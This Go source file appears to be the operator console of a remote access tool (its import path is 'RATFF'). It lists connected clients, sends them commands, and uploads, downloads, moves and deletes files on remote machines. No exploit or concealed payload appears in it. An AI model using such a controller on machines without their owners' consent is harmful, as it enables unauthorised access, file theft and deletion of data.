package main

import (
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"io"
	"os"
	"path/filepath"
	"time"

	"RATFF/shared"
)

func listClients() {
	clients, err := fetchClients()
	if err != nil {
		PrintError(Tf("fetch_clients_failed", err))
		return
	}

	PrintClientTable(clients)
}

func selectClient(id string) bool {
	clients, err := fetchClients()
	if err != nil {
		PrintError(Tf("fetch_clients_failed", err))
		return false
	}

	for _, c := range clients {
		if c.ID == id {
			PrintSuccess(Tf("selected_client", id))
			return true
		}
	}

	PrintError(T("client_not_exists"))
	return false
}

func deleteClient(id string) {
	clients, err := fetchClients()
	if err != nil {
		PrintError(Tf("fetch_clients_failed", err))
		return
	}

	found := false
	for _, c := range clients {
		if c.ID == id {
			found = true
			break
		}
	}

	if !found {
		PrintError(T("client_not_exists"))
		return
	}

	payload := map[string]interface{}{
		"client_id": id,
		"command":   "exit",
	}
	if err := postCommand(payload); err != nil {
		PrintError(Tf("send_exit_failed", err))
		return
	}

	PrintSuccess(T("delete_success"))
}

func cdClient(id string, dir string) {
	clients, err := fetchClients()
	if err != nil {
		PrintError(Tf("fetch_clients_failed", err))
		return
	}

	found := false
	for _, c := range clients {
		if c.ID == id {
			found = true
			break
		}
	}

	if !found {
		PrintError(T("client_not_exists"))
		return
	}

	payload := map[string]interface{}{
		"client_id": id,
		"command":   "cd",
		"payload":   map[string]interface{}{"dir": dir},
	}

	ch := make(chan shared.Message, 1)
	pendingMu.Lock()
	pendingCmd[id] = &pendingCommand{ch: ch}
	pendingMu.Unlock()

	if err := postCommand(payload); err != nil {
		PrintError(Tf("send_command_failed", err))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
		return
	}

	select {
	case msg := <-ch:
		if msg.Payload != nil {
			if errMsg, ok := msg.Payload["error"].(string); ok {
				PrintError(Tf("cd_failed", errMsg))
			} else if currentDir, ok := msg.Payload["current_dir"].(string); ok {
				PrintSuccess(Tf("cd_success", dir, currentDir))
			}
		}
	case <-time.After(10 * time.Second):
		PrintError(T("command_timeout"))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
	}
}

const (
	chunkSize    = 64 * 1024
	chunkTimeout = 30 * time.Second
)

func uploadFile(id, localPath, remotePath string) {
	stat, err := os.Stat(localPath)
	if err != nil {
		PrintError(Tf("file_not_exist", localPath))
		return
	}

	if stat.IsDir() {
		PrintError(T("upload_dir_not_supported"))
		return
	}

	file, err := os.Open(localPath)
	if err != nil {
		PrintError(Tf("file_open_failed", localPath, err))
		return
	}
	defer file.Close()

	fileSize := stat.Size()
	totalChunks := (fileSize + chunkSize - 1) / chunkSize
	fileID := shared.GenerateID()

	filename := filepath.Base(localPath)

	if remotePath == "" || remotePath == "." {
		remotePath = filename
	}

	PrintInfo(Tf("upload_starting", filename, formatBytes(fileSize)))

	payload := map[string]interface{}{
		"file_id":      fileID,
		"remote_path":  remotePath,
		"file_size":    fileSize,
		"chunk_size":   chunkSize,
		"total_chunks": totalChunks,
	}

	if !waitForCommandResponse(id, shared.CmdFileUploadStart, payload, 10*time.Second) {
		return
	}

	progressBar := NewProgressBar(fileSize, filename)

	md5hash := md5.New()

	for i := 0; i < int(totalChunks); i++ {
		chunk := make([]byte, chunkSize)
		n, err := file.Read(chunk)
		if err != nil && err != io.EOF {
			progressBar.MarkDone()
			progressBar.Display()
			PrintError(Tf("file_read_failed", err))
			return
		}

		if n == 0 {
			break
		}

		chunkData := chunk[:n]
		md5hash.Write(chunkData)
		chunkB64 := base64.StdEncoding.EncodeToString(chunkData)

		chunkPayload := map[string]interface{}{
			"file_id":     fileID,
			"chunk_index": i,
			"chunk_data":  chunkB64,
		}

		if !waitForCommandResponse(id, shared.CmdFileUploadChunk, chunkPayload, chunkTimeout) {
			progressBar.MarkDone()
			progressBar.Display()
			PrintError(Tf("upload_chunk_failed", i))
			return
		}

		progressBar.Add(int64(n))
		progressBar.Display()
	}

	completePayload := map[string]interface{}{
		"file_id": fileID,
	}

	msg := waitForCommandResponseWithMsg(id, shared.CmdFileUploadComplete, completePayload, 10*time.Second)
	if msg == nil {
		progressBar.MarkDone()
		progressBar.Display()
		PrintError(T("upload_complete_failed"))
		return
	}

	progressBar.MarkDone()
	progressBar.Display()

	if msg.Payload != nil {
		if remoteMD5, ok := msg.Payload["md5"].(string); ok {
			localMD5 := hex.EncodeToString(md5hash.Sum(nil))
			if remoteMD5 != localMD5 {
				PrintWarn(Tf("upload_md5_mismatch", localMD5, remoteMD5))
			} else {
				PrintSuccess(Tf("upload_success", filename, remotePath))
			}
		} else {
			PrintSuccess(Tf("upload_success", filename, remotePath))
		}
	}
}

func downloadFile(id, remotePath, localPath string) {
	filename := filepath.Base(remotePath)

	if localPath == "" || localPath == "." {
		localPath = filename
	}

	localPath = filepath.Clean(localPath)

	dir := filepath.Dir(localPath)
	if dir != "." && dir != "/" {
		if err := os.MkdirAll(dir, 0755); err != nil {
			PrintError(Tf("create_dir_failed", dir, err))
			return
		}
	}

	fileID := shared.GenerateID()

	PrintInfo(Tf("download_starting", filename, remotePath))

	payload := map[string]interface{}{
		"file_id":    fileID,
		"local_path": remotePath,
	}

	msg := waitForCommandResponseWithMsg(id, shared.CmdFileDownloadStart, payload, 10*time.Second)
	if msg == nil {
		return
	}

	if msg.Payload == nil {
		PrintError(T("download_start_failed"))
		return
	}

	if errMsg, ok := msg.Payload["error"].(string); ok {
		PrintError(Tf("download_start_failed_detail", errMsg))
		return
	}

	fileSizeF, _ := msg.Payload["file_size"].(float64)
	fileSize := int64(fileSizeF)

	outFile, err := os.Create(localPath)
	if err != nil {
		PrintError(Tf("file_create_failed", localPath, err))
		return
	}
	defer outFile.Close()

	totalChunksF, _ := msg.Payload["total_chunks"].(float64)
	totalChunks := int(totalChunksF)

	progressBar := NewProgressBar(fileSize, filename)

	md5hash := md5.New()

	for i := 0; i < totalChunks; i++ {
		chunkPayload := map[string]interface{}{
			"file_id":     fileID,
			"chunk_index": i,
		}

		chunkMsg := waitForCommandResponseWithMsg(id, shared.CmdFileDownloadChunk, chunkPayload, chunkTimeout)
		if chunkMsg == nil {
			progressBar.MarkDone()
			progressBar.Display()
			PrintError(Tf("download_chunk_failed", i))
			return
		}

		if chunkMsg.Payload == nil {
			progressBar.MarkDone()
			progressBar.Display()
			PrintError(Tf("download_chunk_empty", i))
			return
		}

		if errMsg, ok := chunkMsg.Payload["error"].(string); ok {
			progressBar.MarkDone()
			progressBar.Display()
			PrintError(Tf("download_chunk_failed_detail", i, errMsg))
			return
		}

		chunkDataB64, _ := chunkMsg.Payload["chunk_data"].(string)
		chunkData, err := base64.StdEncoding.DecodeString(chunkDataB64)
		if err != nil {
			progressBar.MarkDone()
			progressBar.Display()
			PrintError(Tf("decode_chunk_failed", err))
			return
		}

		n, err := outFile.Write(chunkData)
		if err != nil {
			progressBar.MarkDone()
			progressBar.Display()
			PrintError(Tf("write_chunk_failed", err))
			return
		}

		md5hash.Write(chunkData[:n])
		progressBar.Add(int64(n))
		progressBar.Display()
	}

	completePayload := map[string]interface{}{
		"file_id": fileID,
	}

	msg = waitForCommandResponseWithMsg(id, shared.CmdFileDownloadComplete, completePayload, 10*time.Second)
	if msg == nil {
		progressBar.MarkDone()
		progressBar.Display()
		PrintError(T("download_complete_failed"))
		return
	}

	progressBar.MarkDone()
	progressBar.Display()

	if msg.Payload != nil {
		if remoteMD5, ok := msg.Payload["md5"].(string); ok {
			localMD5 := hex.EncodeToString(md5hash.Sum(nil))
			if remoteMD5 != localMD5 {
				PrintWarn(Tf("download_md5_mismatch", localMD5, remoteMD5))
			} else {
				PrintSuccess(Tf("download_success", remotePath, localPath))
			}
		} else {
			PrintSuccess(Tf("download_success", remotePath, localPath))
		}
	}
}

func waitForCommandResponse(id string, cmd shared.CommandType, payload map[string]interface{}, timeout time.Duration) bool {
	return waitForCommandResponseWithMsg(id, cmd, payload, timeout) != nil
}

func listFiles(id, path string) {
	payload := map[string]interface{}{"path": path}

	msg := waitForCommandResponseWithMsg(id, shared.CmdFileList, payload, 10*time.Second)
	if msg == nil {
		return
	}

	if msg.Payload == nil {
		PrintError(T("file_list_empty"))
		return
	}

	if errMsg, ok := msg.Payload["error"].(string); ok {
		PrintError(Tf("file_list_failed", errMsg))
		return
	}

	currentPath, _ := msg.Payload["path"].(string)
	filesInterface, ok := msg.Payload["files"].([]interface{})
	if !ok {
		PrintError(T("file_list_parse_failed"))
		return
	}

	PrintFileTable(currentPath, filesInterface)
}

func moveFile(id, originPath, newPath string) {
	payload := map[string]interface{}{
		"origin_path": originPath,
		"new_path":    newPath,
	}

	msg := waitForCommandResponseWithMsg(id, shared.CmdFileMove, payload, 10*time.Second)
	if msg == nil {
		return
	}

	if msg.Payload == nil {
		PrintError(T("file_move_failed"))
		return
	}

	if errMsg, ok := msg.Payload["error"].(string); ok {
		PrintError(Tf("file_move_failed_detail", errMsg))
		return
	}

	PrintSuccess(Tf("file_move_success", originPath, newPath))
}

func deleteFile(id, path string) {
	payload := map[string]interface{}{"path": path}

	msg := waitForCommandResponseWithMsg(id, shared.CmdFileDelete, payload, 10*time.Second)
	if msg == nil {
		return
	}

	if msg.Payload == nil {
		PrintError(T("file_delete_failed"))
		return
	}

	if errMsg, ok := msg.Payload["error"].(string); ok {
		PrintError(Tf("file_delete_failed_detail", errMsg))
		return
	}

	PrintSuccess(Tf("file_delete_success", path))
}

func waitForCommandResponseWithMsg(id string, cmd shared.CommandType, payload map[string]interface{}, timeout time.Duration) *shared.Message {
	fullPayload := map[string]interface{}{
		"client_id": id,
		"command":   string(cmd),
		"payload":   payload,
	}

	ch := make(chan shared.Message, 1)
	pendingMu.Lock()
	pendingCmd[id] = &pendingCommand{ch: ch}
	pendingMu.Unlock()

	if err := postCommand(fullPayload); err != nil {
		PrintError(Tf("send_command_failed", err))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
		return nil
	}

	select {
	case msg := <-ch:
		if msg.Payload != nil {
			if errMsg, ok := msg.Payload["error"].(string); ok {
				PrintError(Tf("operation_failed", errMsg))
				return nil
			}
		}
		return &msg
	case <-time.After(timeout):
		PrintError(T("command_timeout"))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
		return nil
	}
}
